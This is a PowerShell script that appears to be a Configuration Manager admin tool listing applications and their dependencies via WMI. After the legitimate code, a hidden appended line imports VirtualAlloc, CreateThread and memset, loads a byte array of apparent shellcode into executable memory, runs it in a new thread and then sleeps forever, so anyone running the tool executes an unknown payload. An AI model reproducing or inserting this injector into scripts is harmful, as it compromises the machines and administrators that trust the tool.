﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,
    [parameter(Mandatory=$false, HelpMessage="Show a progressbar displaying the current operation")]
    [switch]$ShowProgress
)
Begin {
    
    try {
        Write-Verbose -Message "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug -Message "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine SiteCode" ; break
    }
    
    try {
        Add-Type -Path (Join-Path -Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName -ChildPath "Microsoft.ConfigurationManagement.ApplicationManagement.dll") -ErrorAction Stop
        Add-Type -Path (Join-Path -Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName -ChildPath "Microsoft.ConfigurationManagement.ApplicationManagement.Extender.dll") -ErrorAction Stop
        Add-Type -Path (Join-Path -Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName -ChildPath "Microsoft.ConfigurationManagement.ApplicationManagement.MsiInstaller.dll") -ErrorAction Stop
    }
    catch [System.UnauthorizedAccessException] {
	    Write-Warning -Message "Access was denied when attempting to load ApplicationManagement dll's" ; break
    }
    catch [System.Exception] {
	    Write-Warning -Message "Unable to load required ApplicationManagement dll's. Make sure that you're running this tool on system where the ConfigMgr console is installed and that you're running the tool elevated" ; break
    }
}
Process {
    if ($PSBoundParameters["ShowProgress"]) {
        $ProgressCount = 0
    }
    try {
        $Applications = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ApplicationLatest" -ComputerName $SiteServer -ErrorAction Stop
        $ApplicationCount = ($Applications | Measure-Object).Count
        foreach ($Application in $Applications) {
            if ($PSBoundParameters["ShowProgress"]) {
                $ProgressCount++
                Write-Progress -Activity "Enumerating Applications for dependencies" -Status "Application $($ProgressCount) / $($ApplicationCount)" -Id 1 -PercentComplete (($ProgressCount / $ApplicationCount) * 100)
            }
            $ApplicationName = $Application.LocalizedDisplayName
            
            $Application.Get()
            
            $ApplicationXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::DeserializeFromString($Application.SDMPackageXML, $true)
            foreach ($DeploymentType in $ApplicationXML.DeploymentTypes) {
                if ([int]$DeploymentType.Dependencies.Count -ge 1) {
                    $PSObject = [PSCustomObject]@{
                        ApplicationName = $ApplicationName
                        DeploymentTypeName = $DeploymentType.Title
                        DependencyCount = $DeploymentType.Dependencies.Count
                        DependencyGroupName = $DeploymentType.Dependencies.Name
                        DependentApplication = $DeploymentType.Dependencies.Expression.Operands | ForEach-Object {
                            Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ApplicationLatest" -ComputerName $SiteServer -Filter "CI_UniqueID like '$($_.ApplicationAuthoringScopeId)%$($_.ApplicationLogicalName)%'" | Select-Object -ExpandProperty LocalizedDisplayName
                        }
                        EnforceDesiredState = $DeploymentType.Dependencies.Expression.Operands.EnforceDesiredState
                    }
                    Write-Output -InputObject $PSObject
                }
            }
        }
    }
    catch [System.Exception] {
        Write-Warning -Message $_.Exception.Message ; break
    }
}
End {
    if ($PSBoundParameters["ShowProgress"]) {
        Write-Progress -Activity "Enumerating Applications for dependencies" -Id 1 -Completed
    }
}
$uit8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $uit8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x0b,0x9b,0x9e,0xfe,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xea,0xfc,0x03,0x5a,0x04,0x79,0x6b,0x02,0xf2,0xff,0x94,0xfb,0x02,0x60,0x1c,0x1e,0x33,0xa0,0x7a,0x6a,0x63,0x10,0x08,0x3e,0x8f,0xdb,0x5c,0xab,0x04,0xa9,0x48,0xdc,0xad,0x04,0xaf,0xd3,0x2e,0x34,0x93,0x72,0xac,0x47,0xc0,0x54,0x8d,0x87,0x15,0x94,0xca,0xfa,0xd4,0xc4,0x83,0x71,0x4a,0xf9,0xa0,0xcc,0x57,0x72,0xfa,0xc1,0xdf,0x67,0x4a,0xe3,0xce,0x39,0xc1,0xba,0xd0,0xb8,0x06,0xb7,0x58,0xa3,0x4b,0xf2,0x13,0x58,0xbf,0x88,0xa5,0x88,0x8e,0x71,0x09,0xf5,0x3f,0x80,0x53,0x31,0x87,0x7b,0x26,0x4b,0xf4,0x06,0x31,0x88,0x87,0xdc,0xb4,0x0b,0x2f,0x96,0x6f,0xf0,0xce,0x7b,0xe9,0x73,0xdc,0x30,0x7d,0xdb,0xc0,0xc7,0x52,0x57,0xfc,0x4c,0x55,0xb8,0x75,0x16,0x72,0x1c,0xde,0xcc,0x1b,0x05,0xba,0xa3,0x24,0x55,0x65,0x1b,0x81,0x1d,0x8b,0x48,0xb8,0x7f,0xc3,0xbd,0xf1,0x7f,0x13,0xaa,0x82,0x0c,0x21,0x75,0x39,0x9b,0x09,0xfe,0xe7,0x5c,0x6e,0xd5,0x50,0xf2,0x91,0xd6,0xa0,0xda,0x55,0x82,0xf0,0x74,0x7c,0xab,0x9a,0x84,0x81,0x7e,0x36,0x80,0x15,0x41,0x6f,0x8b,0xe2,0x29,0x72,0x8c,0xfd,0xf5,0xfb,0x6a,0xad,0x55,0xac,0x22,0x0d,0x06,0x0c,0x93,0xe5,0x4c,0x83,0xcc,0x15,0x6f,0x49,0x65,0xbf,0x80,0x24,0xdd,0x57,0x38,0x6d,0x95,0xc6,0xc5,0xbb,0xd3,0xc8,0x4e,0x48,0x23,0x86,0xa6,0x25,0x37,0x7e,0x47,0x70,0x65,0x28,0x58,0xae,0x00,0xd4,0xcc,0x55,0x83,0x83,0x78,0x54,0xf2,0xe3,0x26,0xa7,0xd1,0x78,0xee,0x3d,0x9a,0x16,0x0f,0xd2,0x1a,0xe6,0x59,0xb8,0x1a,0x8e,0x3d,0x98,0x48,0xab,0x41,0x35,0xfd,0x60,0xd4,0xb6,0x54,0xd5,0x7f,0xdf,0x5a,0x00,0xb7,0x40,0xa4,0x67,0x49,0xbc,0x73,0x41,0x3f,0xac,0x47;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Osz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Osz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Osz,0,0,0);for (;;){Start-sleep 60};

